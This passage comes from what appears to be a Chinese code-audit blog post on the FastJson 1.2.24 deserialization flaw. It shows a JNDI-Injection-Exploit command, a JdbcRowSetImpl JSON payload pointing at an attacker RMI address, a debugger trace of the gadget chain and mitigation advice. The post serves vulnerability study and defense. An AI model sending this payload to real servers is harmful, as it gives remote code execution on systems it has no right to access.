+<h3 id="6-3-启动-JNDI-服务"><a href="#6-3-启动-JNDI-服务" class="headerlink" title="6.3 启动 JNDI 服务"></a>6.3 启动 JNDI 服务</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span class="string">&quot;calc&quot;</span> -A <span class="string">&quot;172.16.250.1&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/fastjson_image4.png"></p>
+<h3 id="6-4-修改-Payload-地址"><a href="#6-4-修改-Payload-地址" class="headerlink" title="6.4 修改 Payload 地址"></a>6.4 修改 Payload 地址</h3><p>把 payload 里的地址换成 JNDI 工具生成的对应地址：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;dataSourceName&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;rmi://172.16.250.1:1099/4in98t&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;autoCommit&quot;</span> <span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="6-5-成功弹出计算器"><a href="#6-5-成功弹出计算器" class="headerlink" title="6.5 成功弹出计算器"></a>6.5 成功弹出计算器</h3><p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/fastjson_image5.png"></p>
+<p><strong>PoC 验证成功！</strong></p>
+<hr>
+<h2 id="七、底层代码调试分析"><a href="#七、底层代码调试分析" class="headerlink" title="七、底层代码调试分析"></a>七、底层代码调试分析</h2><p>光跑通还不够，接下来打断点进去看看 FastJson 底层到底干了什么。</p>
+<h3 id="7-1-入口分析"><a href="#7-1-入口分析" class="headerlink" title="7.1 入口分析"></a>7.1 入口分析</h3><p>打断点进入函数：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/fastjson_image9.png"></p>
+<p>直接看到用了 <code>parse()</code>：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/fastjson_image10.png"></p>
+<p>所以 <code>JSON.parse(payload)</code> 同样能触发漏洞，不一定要用 <code>parseObject</code>。</p>
+<p>示例：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260324195228667.png"></p>
+<h3 id="7-2-type-字段的识别"><a href="#7-2-type-字段的识别" class="headerlink" title="7.2 @type 字段的识别"></a>7.2 @type 字段的识别</h3><p>进入 <code>com/alibaba/fastjson/parser/DefaultJSONParser.java</code>，发现一个判断语句，判断是否有 <code>@type</code> 的值：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/fastjson_image12.png"></p>
+<p>判断成功后进入处理逻辑：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/fastjson_image13.png"></p>
+<p><code>com.sun.rowset.JdbcRowSetImpl</code> 被提取出来赋值给了 <code>typeName</code>：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/fastjson_image14.png"></p>
+<h3 id="7-3-任意类加载：TypeUtils-loadClass"><a href="#7-3-任意类加载：TypeUtils-loadClass" class="headerlink" title="7.3 任意类加载：TypeUtils.loadClass"></a>7.3 任意类加载：TypeUtils.loadClass</h3><p>接着触发了这个函数：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TypeUtils.loadClass(typeName, config.getDefaultClassLoader());</span><br></pre></td></tr></table></figure>
+
+<p>进去看看，一路的 if 语句都没有成立，最后停到了这里：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/fastjson_image15.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">className: &quot;com.sun.rowset.JdbcRowSetImpl&quot;  ← @type 的值</span><br><span class="line">clazz:     &quot;class com.sun.rowset.JdbcRowSetImpl&quot;  ← 字符串成功变成 Class 对象</span><br></pre></td></tr></table></figure>
+
+<p><strong>这就是漏洞的根源</strong>：FastJson 解析 JSON 时，如果发现 <code>@type</code> 字段，会调用 <code>TypeUtils.loadClass()</code> 把字符串值转成 Class 对象，然后实例化该类并通过反射调用对应的 setter 方法赋值——<strong>任意类都可以被实例化，没有任何限制</strong>。</p>
+<h3 id="7-4-找到-Deserializer"><a href="#7-4-找到-Deserializer" class="headerlink" title="7.4 找到 Deserializer"></a>7.4 找到 Deserializer</h3><p>继续往下执行，发现下面有一个 Deserializer，对象就是 <code>@type</code> 指定的 <code>com.sun.rowset.JdbcRowSetImpl</code>：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/fastjson_image16.png"></p>
+<h3 id="7-5-逐步跟踪-setter-调用"><a href="#7-5-逐步跟踪-setter-调用" class="headerlink" title="7.5 逐步跟踪 setter 调用"></a>7.5 逐步跟踪 setter 调用</h3><p>与其一步一步跟链，不如直接在关键 setter&#x2F;getter 上打断点，效率更高。需要关注的方法：</p>
+<ul>
+<li><code>setDataSourceName</code></li>
+<li><code>getDataSourceName</code></li>
+<li><code>setAutoCommit</code></li>
+<li><code>getAutoCommit</code></li>
+</ul>
+<blockquote>
+<p>搜索 <code>setDataSourceName</code> &#x2F; <code>getDataSourceName</code> 直接搜索搜不到函数，只能找到接口和定义。要找 <code>setAutoCommit</code> &#x2F; <code>getAutoCommit</code>，需要用 <strong>双击 Shift</strong> 搜索类名 <code>JdbcRowSetImpl</code>，定位到 <code>JdbcRowSetImpl.class</code> 后再找对应方法。</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260324195304383.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260324195318140.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260324195333100.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260324195339115.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/fastjson_image21.png"></p>
+<h3 id="7-6-setDataSourceName-执行过程"><a href="#7-6-setDataSourceName-执行过程" class="headerlink" title="7.6 setDataSourceName 执行过程"></a>7.6 setDataSourceName 执行过程</h3><p>再跑一遍调试，进入反序列化函数后，直接跳到下一个断点，到达了 <code>setDataSourceName</code>：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/fastjson_image22.png"></p>
+<p><code>setDataSourceName</code> 被调用，传入 RMI 地址 <code>rmi://172.16.250.1:1099/4in98t</code>，但此时 <code>dataSource</code> 为空，进入 else 判断：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/fastjson_image23.png"></p>
+<p><code>getDataSourceName</code> 被调用，但 <code>dataSource</code> 为空：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/fastjson_image24.png"></p>
+<p>父类 <code>setDataSourceName</code> 执行 <code>dataSource = name</code>，把 RMI 地址真正存进去。</p>
+<p>接下来执行了这个方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">method.invoke(object, value);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/fastjson_image25.png"></p>
+<p><strong>它做的事：</strong></p>
+<p><code>method.invoke(object, value)</code> 是 Java 反射调用，等价于直接调用：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 反射调用 method.invoke(object, value);</span></span><br><span class="line"><span class="comment">// 等价于直接调用：</span></span><br><span class="line">object.setDataSourceName(<span class="string">&quot;rmi://172.16.250.1:1099/xxx&quot;</span>);</span><br><span class="line">object.setAutoCommit(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
+
+<p>有两个重要的参数：</p>
+<ul>
+<li><code>rmi://172.16.250.1:1099/4in98t</code></li>
+<li><code>com.sun.rowset.JdbcRowSetImpl</code></li>
+</ul>
+<h3 id="7-7-setAutoCommit-触发-JNDI-lookup"><a href="#7-7-setAutoCommit-触发-JNDI-lookup" class="headerlink" title="7.7 setAutoCommit 触发 JNDI lookup"></a>7.7 setAutoCommit 触发 JNDI lookup</h3><p>继续：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/fastjson_image26.png"></p>
+<p>进入 <code>setAutoCommit</code>，<code>conn</code> 为 <code>null</code>，走 else 分支：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/fastjson_image27.png"></p>
+<p>执行 <code>this.conn = this.connect()</code>：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/fastjson_image28.png"></p>
+<p>进入 <code>connect()</code>，从 <code>getDataSourceName</code> 取值：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/fastjson_image29.png"></p>
+<p><code>getDataSourceName</code> 再次被调用，这次返回了 RMI 地址，不为空，正常执行 try 里面的内容：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/fastjson_image30.png"></p>
+<p>里面执行了 <code>lookup()</code>，就是 <strong>JNDI lookup</strong>，参数就是 RMI 地址。</p>
+<p>连接恶意 RMI 服务，加载远程恶意类，<strong>RCE 触发</strong>。</p>
+<hr>
+<h2 id="八、完整漏洞链路总结"><a href="#八、完整漏洞链路总结" class="headerlink" title="八、完整漏洞链路总结"></a>八、完整漏洞链路总结</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">JSON.parseObject(payload)</span><br><span class="line">    → @type 加载 JdbcRowSetImpl 类</span><br><span class="line">    → setDataSourceName(&quot;rmi://172.16.250.1:1099/4in98t&quot;)  ← 存入 RMI 地址</span><br><span class="line">    → setAutoCommit(true)</span><br><span class="line">        → connect()</span><br><span class="line">            → JNDI lookup(&quot;rmi://172.16.250.1:1099/4in98t&quot;)  ← 连接恶意 RMI 服务</span><br><span class="line">                → 加载远程恶意类</span><br><span class="line">                    → RCE</span><br></pre></td></tr></table></figure>
+<h3 id="FastJson-RCE-完整流程"><a href="#FastJson-RCE-完整流程" class="headerlink" title="FastJson RCE 完整流程"></a>FastJson RCE 完整流程</h3><p><strong>第一步：攻击者构造恶意 JSON</strong></p>
+<p>攻击者在 JSON 数据里塞一个 <code>@type</code> 字段，值是 <code>com.sun.rowset.JdbcRowSetImpl</code>，同时带上 <code>dataSourceName</code>（填自己控制的 RMI 服务地址）和 <code>autoCommit: true</code>。这段 JSON 被发送到目标服务器上任何会调用 <code>JSON.parseObject()</code> 的接口。</p>
+<p><strong>第二步：FastJson 识别 @type，加载任意类</strong></p>
+<p>目标服务器拿到这段 JSON 开始解析，FastJson 在 <code>DefaultJSONParser</code> 里发现了 <code>@type</code> 字段，于是调用 <code>TypeUtils.loadClass()</code> 把字符串 <code>&quot;com.sun.rowset.JdbcRowSetImpl&quot;</code> 直接转成 Class 对象并实例化。这一步是整个漏洞的根源——1.2.24 及以下没有任何白名单限制，传什么类名就加载什么类。</p>
+<p><strong>第三步：反射调用 setter，存入 RMI 地址</strong></p>
+<p>类加载完成后，FastJson 通过 Java 反射机制依次调用对应字段的 setter 方法。先调 <code>setDataSourceName()</code>，把攻击者的 RMI 地址存进对象里，再调 <code>setAutoCommit(true)</code>。</p>
+<p><strong>第四步：setAutoCommit 触发 JNDI lookup</strong></p>
+<p><code>setAutoCommit</code> 执行时发现数据库连接 <code>conn</code> 是空的，于是调 <code>connect()</code> 去建立连接。<code>connect()</code> 内部取出刚才存进去的 RMI 地址，执行 <code>JNDI lookup()</code>，主动向攻击者控制的 RMI 服务器发起请求。</p>
+<p><strong>第五步：RMI 服务返回恶意类，目标服务器执行</strong></p>
+<p>攻击者的 RMI 服务器收到请求后，返回一个远程恶意类（比如弹计算器、反弹 shell 等）。目标服务器加载并执行这个类，RCE 完成。</p>
+<hr>
+<h2 id="九、修复建议"><a href="#九、修复建议" class="headerlink" title="九、修复建议"></a>九、修复建议</h2><h3 id="方法一：升级版本（推荐）"><a href="#方法一：升级版本（推荐）" class="headerlink" title="方法一：升级版本（推荐）"></a>方法一：升级版本（推荐）</h3><p>升级到 <strong>1.2.25 及以上版本</strong>，FastJson 从 1.2.25 开始引入了 <code>checkAutoType</code> 机制，<code>@type</code> 的自动类型识别<strong>默认关闭</strong>，同时内置了一份危险类黑名单。</p>
+<h3 id="方法二：手动关闭-AutoType（如果无法升级）"><a href="#方法二：手动关闭-AutoType（如果无法升级）" class="headerlink" title="方法二：手动关闭 AutoType（如果无法升级）"></a>方法二：手动关闭 AutoType（如果无法升级）</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="方法三：升级-JDK"><a href="#方法三：升级-JDK" class="headerlink" title="方法三：升级 JDK"></a>方法三：升级 JDK</h3><p>将 JDK 升级到 <strong>8u191 及以上</strong>，可以阻断 JNDI 远程类加载这条路，对基于 RMI&#x2F;LDAP 的利用链有缓解效果。但注意这不是根本修复，仍建议同时升级 FastJson。</p>
+<h3 id="其他缓解措施"><a href="#其他缓解措施" class="headerlink" title="其他缓解措施"></a>其他缓解措施</h3><ul>
+<li>不要在公网暴露含有 FastJson 反序列化处理的接口</li>
+<li>对外部输入进行严格过滤，避免将不可信数据直接传入 <code>JSON.parseObject()</code></li>
+<li>定期扫描项目依赖，关注 FastJson 等高频漏洞组件的安全公告</li>
+</ul>
+<hr>
+<blockquote>
+<p><strong>参考资料</strong></p>
+<ul>
+<li>FastJson 官方 GitHub：<a target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson">https://github.com/alibaba/fastjson</a></li>
+<li>Maven 中央仓库 FastJson 1.2.24：<a target="_blank" rel="noopener" href="https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.24/">https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.24/</a></li>
+</ul>
+</blockquote>
+</article>
+<div class="article-footer">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    
+
+</div>
+
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/posts/86d6dbe4/">代码审计 | FastJSON 反序列化分析：1.2.25 / 1.2.42 / 1.2.43</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/posts/5532e4a/">THP-CSK 靶场 Linux 内网横向渗透全流程</a></div></section></div>
+
+
+
+
+
+
+<footer class="page-footer footnote"><hr><div class="text"></div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95"><span class="toc-text">目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%BC%8F%E6%B4%9E%E8%83%8C%E6%99%AF"><span class="toc-text">一、漏洞背景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="toc-text">二、环境准备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%90%AD%E5%BB%BA-Maven-%E9%A1%B9%E7%9B%AE"><span class="toc-text">三、搭建 Maven 项目</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E5%BB%BA-Maven-%E9%A1%B9%E7%9B%AE"><span class="toc-text">第一步：建 Maven 项目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E6%B7%BB%E5%8A%A0-FastJson-%E4%BE%9D%E8%B5%96"><span class="toc-text">第二步：添加 FastJson 依赖</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E4%B8%8B%E8%BD%BD%E4%BE%9D%E8%B5%96"><span class="toc-text">第三步：下载依赖</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81FastJson-type-%E6%9C%BA%E5%88%B6%E5%88%9D%E6%8E%A2%EF%BC%88User-%E4%BE%8B%E5%AD%90%EF%BC%89"><span class="toc-text">四、FastJson @type 机制初探（User 例子）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-%E5%88%9B%E5%BB%BA-User-%E7%B1%BB"><span class="toc-text">4.1 创建 User 类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-%E4%BF%AE%E6%94%B9-Main-java-%E6%B5%8B%E8%AF%95%E8%A7%A3%E6%9E%90"><span class="toc-text">4.2 修改 Main.java 测试解析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-3-%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C"><span class="toc-text">4.3 运行结果</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81parseObject-%E4%B8%A4%E7%A7%8D%E8%B0%83%E7%94%A8%E6%96%B9%E5%BC%8F%E7%9A%84%E6%9C%AC%E8%B4%A8%E5%8C%BA%E5%88%AB"><span class="toc-text">五、parseObject 两种调用方式的本质区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81PoC-%E5%A4%8D%E7%8E%B0%EF%BC%9AJdbcRowSetImpl-%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-text">六、PoC 复现：JdbcRowSetImpl 利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#6-1-%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8-JdbcRowSetImpl%EF%BC%9F"><span class="toc-text">6.1 为什么用 JdbcRowSetImpl？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-2-%E7%BC%96%E5%86%99-Payload"><span class="toc-text">6.2 编写 Payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-3-%E5%90%AF%E5%8A%A8-JNDI-%E6%9C%8D%E5%8A%A1"><span class="toc-text">6.3 启动 JNDI 服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-4-%E4%BF%AE%E6%94%B9-Payload-%E5%9C%B0%E5%9D%80"><span class="toc-text">6.4 修改 Payload 地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-5-%E6%88%90%E5%8A%9F%E5%BC%B9%E5%87%BA%E8%AE%A1%E7%AE%97%E5%99%A8"><span class="toc-text">6.5 成功弹出计算器</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E5%BA%95%E5%B1%82%E4%BB%A3%E7%A0%81%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="toc-text">七、底层代码调试分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#7-1-%E5%85%A5%E5%8F%A3%E5%88%86%E6%9E%90"><span class="toc-text">7.1 入口分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-2-type-%E5%AD%97%E6%AE%B5%E7%9A%84%E8%AF%86%E5%88%AB"><span class="toc-text">7.2 @type 字段的识别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-3-%E4%BB%BB%E6%84%8F%E7%B1%BB%E5%8A%A0%E8%BD%BD%EF%BC%9ATypeUtils-loadClass"><span class="toc-text">7.3 任意类加载：TypeUtils.loadClass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-4-%E6%89%BE%E5%88%B0-Deserializer"><span class="toc-text">7.4 找到 Deserializer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-5-%E9%80%90%E6%AD%A5%E8%B7%9F%E8%B8%AA-setter-%E8%B0%83%E7%94%A8"><span class="toc-text">7.5 逐步跟踪 setter 调用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-6-setDataSourceName-%E6%89%A7%E8%A1%8C%E8%BF%87%E7%A8%8B"><span class="toc-text">7.6 setDataSourceName 执行过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-7-setAutoCommit-%E8%A7%A6%E5%8F%91-JNDI-lookup"><span class="toc-text">7.7 setAutoCommit 触发 JNDI lookup</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AB%E3%80%81%E5%AE%8C%E6%95%B4%E6%BC%8F%E6%B4%9E%E9%93%BE%E8%B7%AF%E6%80%BB%E7%BB%93"><span class="toc-text">八、完整漏洞链路总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FastJson-RCE-%E5%AE%8C%E6%95%B4%E6%B5%81%E7%A8%8B"><span class="toc-text">FastJson RCE 完整流程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B9%9D%E3%80%81%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-text">九、修复建议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A%E5%8D%87%E7%BA%A7%E7%89%88%E6%9C%AC%EF%BC%88%E6%8E%A8%E8%8D%90%EF%BC%89"><span class="toc-text">方法一：升级版本（推荐）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A%E6%89%8B%E5%8A%A8%E5%85%B3%E9%97%AD-AutoType%EF%BC%88%E5%A6%82%E6%9E%9C%E6%97%A0%E6%B3%95%E5%8D%87%E7%BA%A7%EF%BC%89"><span class="toc-text">方法二：手动关闭 AutoType（如果无法升级）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89%EF%BC%9A%E5%8D%87%E7%BA%A7-JDK"><span class="toc-text">方法三：升级 JDK</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD"><span class="toc-text">其他缓解措施</span></a></li></ol></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>回到顶部</span></a></div></widget>
+
+<widget class="widget-wrapper linklist collapsible-widget"><div class="widget-header dis-select"><span class="name">文章分类</span><span class="collapse-toggle"><i class="fas fa-chevron-down"></i></span></div><div class="widget-body fs14"><div class="linklist left style-1" style="grid-template-columns:repeat(1,1fr);"><a class="link" title="代码审计" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><div class="flex"><span>代码审计</span><span class="count">6</span></div></a><a class="link" title="笔记" href="/categories/%E7%AC%94%E8%AE%B0/"><div class="flex"><span>笔记</span><span class="count">2</span></div></a><a class="link" title="vulnhub-DC" href="/categories/vulnhub-DC/"><div class="flex"><span>vulnhub-DC</span><span class="count">9</span></div></a><a class="link" title="DVWA" href="/categories/DVWA/"><div class="flex"><span>DVWA</span><span class="count">3</span></div></a><a class="link" title="靶机渗透" href="/categories/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"><div class="flex"><span>靶机渗透</span><span class="count">1</span></div></a><a class="link" title="工具魔改" href="/categories/%E5%B7%A5%E5%85%B7%E9%AD%94%E6%94%B9/"><div class="flex"><span>工具魔改</span><span class="count">3</span></div></a><a class="link" title="靶场" href="/categories/%E9%9D%B6%E5%9C%BA/"><div class="flex"><span>靶场</span><span class="count">1</span></div></a></div></div></widget>
+</div></aside><div class='float-panel'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+
+
+<script type="text/javascript">
+  window.canonical = {"originalHost":null,"officialHosts":["localhost"],"encoded":""};
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+    tag_plugins: {
+      chat: Object.assign({"api":"https://siteinfo.listentothewind.cn/api/v1"}),
+    }
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"skip_search":null,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+    loading: `https://api.iconify.design/eos-icons:three-dots-loading.svg?color=%231cd0fd`,
+  };
+  const deps = {
+    jquery: `https://gcore.jsdelivr.net/npm/jquery@3.7/dist/jquery.min.js`,
+    marked: `https://gcore.jsdelivr.net/npm/marked@13.0/lib/marked.umd.min.js`,
+    lazyload: `/%5Bobject%20Object%5D`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  
+  function RunItem() {
+    this.list = []; // 存放回调函数
+    this.start = () => {
+      for (var i = 0; i < this.list.length; i++) {
+        this.list[i].run();
+      }
+    };
+    this.push = (fn, name, setRequestAnimationFrame = true) => {
+      let myfn = fn
+      if (setRequestAnimationFrame) {
+        myfn = () => {
+          utils.requestAnimationFrame(fn)
+        }
+      }
+      var f = new Item(myfn, name);
+      this.list.push(f);
+    };
+    this.remove = (name) => {
+      for (let index = 0; index < this.list.length; index++) {
+        const e = this.list[index];
+        if (e.name == name) {
+          this.list.splice(index, 1);
+        }
+      }
+    }
+    // 构造一个可以run的对象
+    function Item(fn, name) {
+      // 函数名称
+      this.name = name || fn.name;
+      // run方法
+      this.run = () => {
+        try {
+          fn()
+        } catch (error) {
+          console.log(error);
+        }
+      };
+    }
+  }
+
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
